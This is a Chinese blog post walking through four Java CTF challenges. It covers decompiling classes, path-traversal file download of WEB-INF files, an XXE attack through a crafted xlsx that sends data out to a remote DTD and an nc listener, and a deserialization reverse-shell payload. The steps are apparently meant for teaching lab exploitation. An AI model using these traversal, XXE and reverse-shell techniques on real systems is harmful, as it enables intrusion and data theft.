---
title: "CTF夺旗-JAVA考点反编译&XXE&反序列化"
date: 2025-12-31 13:49:00
disableNunjucks: true
---
# CTF夺旗-JAVA考点反编译&XXE&反序列化

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117100137072-1064275537.png)

**Java 常考点及出题思路**

考点技术：xxe，spel 表达式，反序列化，文件安全，最新框架插件漏洞等

设法间接给出源码或相关配置提示文件，间接性源码或直接源码体现等形式

CTF 中常见 Web 源码泄露总结 (参考：https://www.cnblogs.com/xishaonian/p/7628153.html)

1. .ng 源码泄露
2. git 源码泄露
3. .Ds_store 文件泄漏
4. 网站备份压缩文件
5. SVN 导致文件泄露
6. WEB-INF/web. xml 泄露
7. CVS 泄漏

**Java 必备知识点**

反编译，基础的 Java 代码认知及审计能力，熟悉相关最新的漏洞，常见漏洞等

**本课重点：**

* 案例 1：Java 简单逆向解密 - Reverse-buuoj - 逆向源码
* 案例 2：RoarCTF-2019-easy_java - 配置到源码
* 案例 3：网鼎杯 2020 - 青龙组 - filejava-ctfhub - 配置到源码
* 案例 4：网鼎杯 - 朱雀组 - Web-think_java - 直接源码审计

**案例 1：Java 简单逆向解密 - Reverse-buuoj - 逆向源码**

靶场地址：https://buuoj.cn/challenges#Java 逆向解密

知识点：java 项目格式解析，加解密脚本等

下载提示文件 - class 反编译 Java 文件 - 加密算法 - 解密脚本

<1> 下载附件，将源码用 idea 打开，分析加密算法，得知加密算法时是将原始 key 先加 64 再异或 32 得到加密后的 key，如下图所示。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117101228670-323701099.png)

<2> 自己编写一个解密算法，将加密后的 key 先异或 32 再减 64，得到原始 key。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117100945321-292269676.png)

**案例 2：RoarCTF-2019-easy_java - 配置到源码**

靶场地址：https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java

知识点：下载漏洞利用，配置文件解析，Javaweb 项目结构等

提示 - 下载漏洞 - 更换请求方法 - 获取源码配置文件 - 指向 Flag - 下载 class - 反编译

WEB-INF 主要包含以下文件或目录:

* /WEB-INF/web.xml：web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
* /WEB-INF/classes/：包含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在. jar 文件中
* /WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件
* /WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件。
* /WEB-INF/database.properties：数据库配置文件

漏洞检测以及利用方法：通过找到 web.xml 文件，推断 class 文件的路径，最后直接查看或下载 class 文件，再通过反编译 class 文件，得到网站源码

<1> 进入场景，是个登录框

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117134931180-839397442.png)

<2> 点击 help，显示如下，url 为 / Download?filename=help.docx，猜测有任意文件下载漏洞。

 ![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117135000868-580831588.png)

<3> 尝试下载 / WEB-INF/web.xml 文件，失败。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117135046414-1499640894.png)

<4> 改为 post 请求方法提交，成功下载（这脑洞有点大，此后下载均用 post）。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117135221285-1358023730.png)

<5> 根据 web.xml 内容，找到与 Flag 相关 class，尝试下载，下载成功

```
POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class

```

 ![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117140035162-1652334812.png)

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117140111487-2140096475.png)

<6> 反编译 class 文件，得到网站源码，找到 base64 编码后的 flag。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117140314461-1690195114.png)

<7> 经过 base64 解码，得到 flag。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117140440725-398367244.png)

**案例 3：网鼎杯 2020 - 青龙组 - filejava-ctfhub - 配置到源码**

https://xz.aliyun.com/t/7272 一篇文章读懂 Java 代码审计之 XXE
https://www.jianshu.com/p/73cd11d83c30 Apache POI XML 外部实体（XML External Entity，XXE）攻击详解
https://blog.spoock.com/2018/10/23/java-xxe/ JAVA 常见的 XXE 漏洞写法和防御
https://www.cnblogs.com/tr1ple/p/12522623.html Java XXE 漏洞典型场景分析

靶场地址：https://www.ctfhub.com/#/challenge 搜索 FileJava

过关思路：
JavaWeb 程序，编译 class 格式，配置文件获取文件路径信息，IDEA 打开查看
../../../../WEB-INF/web.xml
../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class
../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class
../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class
代码审计 Javaweb 代码，发现 flag 位置，文件下载获取？过滤，利用漏洞 XXE 安全

<1> 页面打开如下，是一个文件上传功能。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154204912-203022098.png)

<2> 随便上传一个文件，发现返回一个文件下载链接。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154308692-148087209.png)

<3> 点击文件下载，看到请求包格式，猜测有任意文件下载漏洞。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154345027-1906292682.png)

<4> 构造 filename 值，尝试下载 / WEB-INF/web.xml 文件，下载成功

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154425129-2109148589.png)

<5> 根据 / WEB-INF/web.xml 文件内容，找到 class 文件，全部下载

```
filename=../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class
filename=../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class
filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class

```

<6>idea 反编译 class 文件，得到网站源码，分析源码，发现文件下载时过滤 flag 关键字，因此不能在此处直接下载 flag 文件。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154851385-243649654.png)

<7> 继续分析源码，找到 poi-ooxml-3.10，该版本存在 XXE 漏洞（CVE-2014-3529）

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117154708293-567982523.png)

<8> 构造上传文件

(a) 本地新建 excel-aaa.xlsx 文件，修改后缀名. zip，打开压缩包，其中有 [Content-Types].xml 文件。

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117160233044-834097184.png)

 (b) 修改 [Content-Types].xml，第二行添加如下内容，保存。

```
%remote;%int;%send;
]>

```

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117155631255-223870877.png)

(c) 将修改后的压缩包重新修改后缀为. xlsx 文件

<9> 构造远程监控

(a) 进入远程服务器 WEB 根目录，创建文件 xxx.dtd，添加内容

```
">

```

(b) 启动监控 ：nc -lvvp 3333

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117155702111-254746109.png)

<10> 一切准备就绪，上传 excel-aaa.xlsx 文件

<11> 查看 nc 监听结果，得到 flag

![](https://img2020.cnblogs.com/blog/1375459/202201/1375459-20220117160401460-2145487387.png)

**案例 4：网鼎杯 - 朱雀组 - Web-think_java - 直接源码审计**

靶场地址：https://www.ctfhub.com/\#/challenge

解题思路：

* 注入判断，获取管理员帐号密码
* /swagger-ui.html 接口测试，回显序列化 token（rO0AB 开头）
* SerializationDumper 工具生成反序列化 payload（反弹 shell）-->base64 编码 --> 最终 payload
* 使用该 payload 访问接口 / common/user/current
* 启动监听，获取 flag：nc -lvvp 4444

具体解题步骤参考：[38：WEB 漏洞 - 反序列化之 PHP&amp;JAVA 全解 (下)](https://www.cnblogs.com/zhengna/p/15737517.html)（https://www.cnblogs.com/zhengna/p/15737517.html）


